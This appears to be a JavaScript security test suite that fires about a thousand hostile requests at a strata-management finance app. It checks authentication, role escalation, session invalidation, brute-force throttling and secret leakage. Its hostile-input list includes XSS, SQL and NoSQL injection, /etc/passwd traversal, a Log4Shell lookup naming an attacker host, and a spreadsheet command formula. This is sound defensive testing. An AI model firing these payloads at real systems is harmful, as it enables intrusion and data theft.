/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 *
 * A thousand hostile requests, judged the way a security reviewer would judge them.
 *
 * The threat model is the real one, not a generic web one. This application holds
 * a strata corporation's financial records on a desktop in Ocho Rios, reachable
 * over a plain-HTTP LAN and over Tailscale from phones. The people with accounts
 * are junior officers, a finance officer, a manager and an administrator, and the
 * most likely incident is not a stranger on the internet — it is **an insider
 * doing something they should not be able to do**, or a laptop left signed in.
 *
 * So the questions asked here are:
 *
 *   - **Does anything at all answer without a session?** Every route, tried cold.
 *   - **Do the roles actually hold on the server**, or only in the interface?
 *     A hidden button is not an access control.
 *   - **Can a junior officer promote themselves?** Escalation via their own
 *     record, their own permissions, or somebody else's password reset.
 *   - **Do secrets leak?** No password hash, no salt, no session token may ever
 *     leave the server, in any response, including error messages.
 *   - **Does signing out actually invalidate the session**, and does changing a
 *     password invalidate the sessions of whoever knew the old one?
 *   - **Is a forged or tampered session token rejected?**
 *   - **Do stack traces or internal paths reach the client?**
 *   - **Is brute force throttled**, and does the lockout get recorded?
 *   - **Is stored text kept as data** rather than becoming markup or a command?
 *
 * Nothing here exploits the machine it runs on. Every probe is an HTTP request
 * this application already exposes, which is exactly the surface an insider has.
 */

import { startServer, makeClient, reporter, activateAdmin } from './harness.mjs';

export const title = 'A security reviewer judging a thousand hostile requests';

const PROBE_COUNT = 1000;

function rng(seed) {
  let s = seed >>> 0;
  return () => {
    s = (s * 1664525 + 1013904223) >>> 0;
    return s / 4294967296;
  };
}
const pick = (rand, list) => list[Math.floor(rand() * list.length) % list.length];

/** Text that must be stored as text and never interpreted as anything else. */
const NASTY_STRINGS = [
  '<script>alert(document.cookie)</script>',
  '"><img src=x onerror=alert(1)>',
  "'; DROP TABLE payments; --",
  '{"$ne": null}',
  '../../../../etc/passwd',
  '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '${jndi:ldap://attacker/x}',
  '{{7*7}}',
  '\u0000truncated',
  '=cmd|\' /C calc\'!A0',
  'Ω'.repeat(300)
];

export default async function run({ port, projectRoot }) {
  const srv = await startServer({ port, adminPassword: 'Security-1234!', projectRoot });
  const T = reporter(title);

  const leaks = [];
  const escalations = [];
  const serverErrors = [];
  let probes = 0;

  /** Anything that must never appear in a response body, in any form. */
  const scanForSecrets = (label, body) => {
    if (body === undefined || body === null) return;
    const text = typeof body === 'string' ? body : JSON.stringify(body);
    if (!text) return;
    for (const [what, pattern] of [
      ['a password hash', /"passwordHash"|"hash"\s*:\s*"[0-9a-f]{64,}"/i],
      ['a password salt', /"salt"\s*:\s*"[0-9a-f]{16,}"/i],
      ['a session token', /"token"\s*:\s*"[0-9a-f]{40,}"/i],
      ['a stack trace', /\n\s+at\s+[\w$.<>]+\s+\(/],
      ['an internal file path', /\/(Users|home)\/[\w.-]+\/.*\.(ts|js|cjs)\b/]
    ]) {
      if (pattern.test(text)) leaks.push(`${label} leaked ${what}`);
    }
  };

  const probe = async (label, fn) => {
    probes++;
    try {
      const res = await fn();
      if (res && typeof res.status === 'number') {
        if (res.status >= 500) serverErrors.push(`${label} → ${res.status}`);
        scanForSecrets(label, res.body);
      }
      return res;
    } catch (err) {
      serverErrors.push(`${label} threw — ${err.message}`);
      return { status: 0, body: null };
    }
  };

  try {
    const admin = makeClient(srv.baseUrl);
    await activateAdmin(admin, 'Security-1234!', 'SecurityNew-9876!');

    /* ================================================================
     * 1. Nothing answers without a session.
     * ================================================================ */

    const READ_ROUTES = ['/api/db', '/api/integrity', '/api/backup/status', '/api/backup/download', '/api/backup/drives'];
    const WRITE_ROUTES = [
      ['/api/payments', { unitId: 'unit-1', category: 'Rent', amount: 1000, currency: 'JMD', payerName: 'x', method: 'Cash' }],
      ['/api/expenses', { category: 'Maintenance', description: 'x', amount: 100, currency: 'JMD', date: '2026-05-05', vendor: 'V' }],
      ['/api/charges/post-month', { monthString: '2026-05' }],
      ['/api/users', { name: 'Intruder', username: 'intruder', role: 'ADMINISTRATOR', password: 'Intruder-1234!' }],
      ['/api/settings', { strataPlanNumber: '9999' }],
      ['/api/backup/run', {}]
    ];

    const stranger = makeClient(srv.baseUrl);
    const unauthenticated = [];
    for (const route of READ_ROUTES) {
      const res = await probe(`anonymous GET ${route}`, () => stranger.get(route));
      if (res.status !== 401) unauthenticated.push(`GET ${route} → ${res.status}`);
    }
    for (const [route, payload] of WRITE_ROUTES) {
      const res = await probe(`anonymous POST ${route}`, () => stranger.post(route, payload));
      if (res.status !== 401) unauthenticated.push(`POST ${route} → ${res.status}`);
    }
    for (const route of ['/api/units/unit-1']) {
      const res = await probe(`anonymous PUT ${route}`, () => stranger.put(route, { number: '1', ownerName: 'Intruder' }));
      if (res.status !== 401) unauthenticated.push(`PUT ${route} → ${res.status}`);
    }
    T.check('nothing answers to a request with no session', unauthenticated.length === 0, unauthenticated.slice(0, 4).join('; '));

    /* --- forged, tampered and stale tokens --- */
    const forged = [];
    for (const token of ['', 'x', '0'.repeat(64), 'a'.repeat(64), '../admin', 'null', 'undefined', '%00', 'Bearer admin']) {
      const res = await probe(`forged cookie ${token.slice(0, 12)}`, () =>
        stranger.get('/api/db', { headers: { Cookie: `vds_session=${token}` }, noCookie: true })
      );
      if (res.status !== 401) forged.push(`${token.slice(0, 12)} → ${res.status}`);
    }
    T.check('a forged or tampered session cookie is rejected', forged.length === 0, forged.join('; '));

    /* ================================================================
     * 2. The roles hold on the server, not just in the interface.
     * ================================================================ */

    const ROLES = ['MANAGER', 'FINANCE_OFFICER', 'JUNIOR_OFFICER'];
    const staff = {};
    for (const role of ROLES) {
      const username = `officer_${role.toLowerCase()}`;
      const password = `Officer-${role}-1234!`;
      const made = await admin.post('/api/users', { name: `Officer ${role}`, username, role, password, email: '' });
      if (made.status >= 300) {
        T.check(`a ${role} account could be created for the test`, false, JSON.stringify(made.body).slice(0, 160));
        continue;
      }
      const client = makeClient(srv.baseUrl);
      const login = await client.post('/api/auth/login', { username, password }, { captureCookie: true });
      if (login.status === 200 && login.body?.user?.mustChangePassword) {
        await client.post('/api/auth/change-password', { currentPassword: password, newPassword: `${password}xY9` });
      }
      staff[role] = { client, id: made.body?.user?.id, username, password: `${password}xY9` };
    }
    T.check('an account of each staff role exists to test with', Object.keys(staff).length === ROLES.length, Object.keys(staff).join(', '));

    /* --- only an administrator may manage users --- */
    for (const role of ROLES) {
      const s = staff[role];
      if (!s) continue;
      const create = await probe(`${role} creating a user`, () => s.client.post('/api/users', { name: 'Sneak', username: `sneak_${role}`, role: 'ADMINISTRATOR', password: 'Sneak-1234!' }));
      if (create.status < 300) escalations.push(`${role} created a user (${create.status})`);

      // There is no GET /api/users: the staff list travels inside /api/db. Reading it is
      // not itself escalation, but it must never carry credentials.
      const listUsers = await probe(`${role} reading the staff list`, () => s.client.get('/api/db'));
      if (listUsers.status < 300 && Array.isArray(listUsers.body?.users)) {
        scanForSecrets(`${role} user list`, listUsers.body.users);
      }

      /*
       * A *valid* reset request, deliberately.
       *
       * The first version of this posted an empty body, which the endpoint
       * refuses on validation before it ever reaches the permission check — so
       * the assertion passed without testing authorisation at all. A security
       * test that passes for the wrong reason is worse than no test, because it
       * is counted as coverage. This one is well-formed, so the only thing that
       * can refuse it is the permission gate.
       */
      const resetSomeoneElse = await probe(`${role} resetting the administrator password`, () =>
        s.client.post('/api/users/user-1/reset-password', { password: 'Hijacked-1234!' })
      );
      if (resetSomeoneElse.status < 300) escalations.push(`${role} reset another user's password (${resetSomeoneElse.status})`);

      // Promoting themselves, by their own id and by somebody else's.
      const selfPromote = await probe(`${role} promoting themselves`, () =>
        s.client.put(`/api/users/${s.id}`, { role: 'ADMINISTRATOR', permissions: { recordPayments: true, manageSettings: true, modifySettledRecords: true } })
      );
      if (selfPromote.status < 300) {
        const check = await s.client.get('/api/auth/me');
        if (check.body?.user?.role === 'ADMINISTRATOR') escalations.push(`${role} promoted themselves to ADMINISTRATOR`);
      }

      const changeSettings = await probe(`${role} changing system settings`, () =>
        s.client.post('/api/settings', { strataPlanNumber: '9999', booksBeginOn: '2020-01-01' })
      );
      if (role !== 'MANAGER' && changeSettings.status < 300) {
        escalations.push(`${role} changed system settings (${changeSettings.status})`);
      }
    }
    T.check('no member of staff could grant themselves powers they were not given', escalations.length === 0, escalations.slice(0, 4).join('; '));

    /*
     * The session cookie's own defences, inspected on a real sign-in.
     *
     * Checked here rather than at the end because the brute-force section below
     * deliberately locks the sign-in throttle, and a locked-out login returns no
     * cookie to inspect — the first version of this test measured its own
     * interference and reported the header as missing.
     */
    {
      const fresh = makeClient(srv.baseUrl);
      const finance = staff.FINANCE_OFFICER;
      const loginRes = finance
        ? await fresh.post('/api/auth/login', { username: finance.username, password: finance.password }, { captureCookie: true })
        : { setCookie: '' };
      const setCookie = String(loginRes.setCookie || '');
      T.check('a successful sign-in issues a session cookie', setCookie.length > 0, `status ${loginRes.status}`);
      T.check('the session cookie is HttpOnly, so a script cannot read it', /HttpOnly/i.test(setCookie), setCookie.slice(0, 140));
      T.check('and SameSite=Strict, which is what blocks cross-site request forgery here', /SameSite=Strict/i.test(setCookie), setCookie.slice(0, 140));
      T.check('and it is scoped to the whole application, with a bounded lifetime', /Path=\//.test(setCookie) && /Max-Age=\d+/.test(setCookie), setCookie.slice(0, 140));
    }

    /* --- a junior officer's gated actions are refused with 403, not 500 --- */
    const junior = staff.JUNIOR_OFFICER;
    const juniorAttempts = [];
    if (junior) {
      const gated = [
        ['reverse a receipt', () => junior.client.post('/api/payments/any-id/reverse', { reversalReason: 'entered in error' })],
        ['post the month', () => junior.client.post('/api/charges/post-month', { monthString: '2026-05' })],
        ['run a backup', () => junior.client.post('/api/backup/run', {})],
        ['manage users', () => junior.client.post('/api/users', { name: 'X', username: 'x1', role: 'JUNIOR_OFFICER', password: 'Xx-1234567!' })]
      ];
      for (const [label, fn] of gated) {
        const res = await probe(`junior: ${label}`, fn);
        if (res.status >= 500) juniorAttempts.push(`${label} → ${res.status}`);
      }
    }
    T.check('a refused action is refused cleanly, never with a server error', juniorAttempts.length === 0, juniorAttempts.join('; '));

    /* ================================================================
     * 3. Sessions end when they are supposed to.
     * ================================================================ */

    if (junior) {
      const before = await junior.client.get('/api/db');
      await junior.client.post('/api/auth/logout', {});
      const afterLogout = await probe('reusing a signed-out session', () => junior.client.get('/api/db'));
      T.check(
        'signing out invalidates the session on the server, not just in the browser',
        before.status === 200 && afterLogout.status === 401,
        `before ${before.status}, after ${afterLogout.status}`
      );

      // Sign back in, then have the administrator reset the password: the old
      // session must not survive somebody else taking control of the account.
      const again = makeClient(srv.baseUrl);
      await again.post('/api/auth/login', { username: junior.username, password: junior.password }, { captureCookie: true });
      const live = await again.get('/api/db');
      const reset = await admin.post(`/api/users/${junior.id}/reset-password`, { password: 'Rotated-9876!' });
      const afterReset = await probe('a session held across a password reset', () => again.get('/api/db'));
      T.check('an administrator can rotate a staff password', reset.status === 200, JSON.stringify(reset.body).slice(0, 140));
      T.check(
        'resetting an account password ends the sessions already open on it',
        live.status === 200 && afterReset.status === 401,
        `live ${live.status}, after reset ${afterReset.status}`
      );
    }

    /* ================================================================
     * 4. Brute force is throttled, and the lockout is recorded.
     * ================================================================ */

    const attacker = makeClient(srv.baseUrl);
    let blocked = 0;
    let lastStatus = 0;
    for (let i = 0; i < 40; i++) {
      const res = await probe(`brute force ${i}`, () => attacker.post('/api/auth/login', { username: 'admin', password: `wrong-${i}` }));
      lastStatus = res.status;
      if (res.status === 429) blocked++;
    }
    T.check('repeated failed sign-ins are throttled rather than answered forever', blocked > 0, `${blocked} of 40 refused with 429, last status ${lastStatus}`);
    T.check('and the correct password is never revealed by a different status code', lastStatus === 429 || lastStatus === 401, `${lastStatus}`);

    const auditAfter = (await admin.get('/api/db')).body.auditLogs || [];
    T.check(
      'the lockout is written to the audit trail, so somebody can see it happened',
      auditAfter.some(a => /sign-in|lockout|blocked/i.test(a.action || '')),
      'no sign-in failure recorded'
    );

    /* ================================================================
     * 5. Hostile text is stored as text.
     * ================================================================ */

    const stored = [];
    for (let i = 0; i < NASTY_STRINGS.length; i++) {
      const value = NASTY_STRINGS[i];
      const res = await probe(`storing hostile text ${i}`, () =>
        admin.post('/api/expenses', { category: 'Maintenance', description: value, amount: 100 + i, currency: 'JMD', date: '2026-05-05', vendor: value })
      );
      if (res.status < 300) stored.push(value);
    }
    const dbNow = (await admin.get('/api/db')).body;
    T.check('hostile text is accepted or refused, but never crashes the server', serverErrors.length === 0, serverErrors.slice(0, 3).join('; '));
    T.check(
      'and whatever was stored comes back as the same literal text, not as markup',
      dbNow.expenses.every(e => typeof e.description === 'string'),
      'a description came back as something other than a string'
    );
    const integrityAfterNasty = (await admin.get('/api/integrity')).body;
    T.check(
      'the books remain coherent after hostile input',
      (integrityAfterNasty?.findings || []).filter(f => f.severity === 'serious').length === 0,
      JSON.stringify((integrityAfterNasty?.findings || []).map(f => f.code))
    );

    /* ================================================================
     * 6. Secrets never leave the machine.
     * ================================================================ */

    scanForSecrets('/api/db', dbNow);
    // Settings and the staff list are only readable as part of /api/db (there is no
    // GET /api/settings or GET /api/users); scan each part on its own as well.
    scanForSecrets('settings', dbNow.settings);
    scanForSecrets('users', dbNow.users);
    scanForSecrets('/api/backup/download', (await admin.get('/api/backup/download')).body);
    scanForSecrets('/api/auth/me', (await admin.get('/api/auth/me')).body);

    T.check(
      'no response anywhere carried a password hash, a salt, a session token, a stack trace or an internal path',
      leaks.length === 0,
      leaks.slice(0, 4).join('; ')
    );

    /* ================================================================
     * 7. Volume: keep probing until a thousand requests have been made.
     * ================================================================ */

    const rand = rng(31337);
    const targets = [...READ_ROUTES];
    while (probes < PROBE_COUNT) {
      const route = pick(rand, targets);
      const asStranger = rand() > 0.5;
      const client = asStranger ? stranger : admin;
      const res = await probe(`sweep ${route}`, () => client.get(route));
      if (asStranger && res.status !== 401) unauthenticated.push(`sweep GET ${route} → ${res.status}`);
    }

    T.check(`${probes} hostile or unauthorised requests were made`, probes >= PROBE_COUNT, `${probes}`);
    T.check('not one of them produced a server error', serverErrors.length === 0, serverErrors.slice(0, 4).join('; '));
    T.check('and not one of them reached data without a session', unauthenticated.length === 0, unauthenticated.slice(0, 4).join('; '));
  } finally {
    await srv.stop();
  }

  return T.done();
}
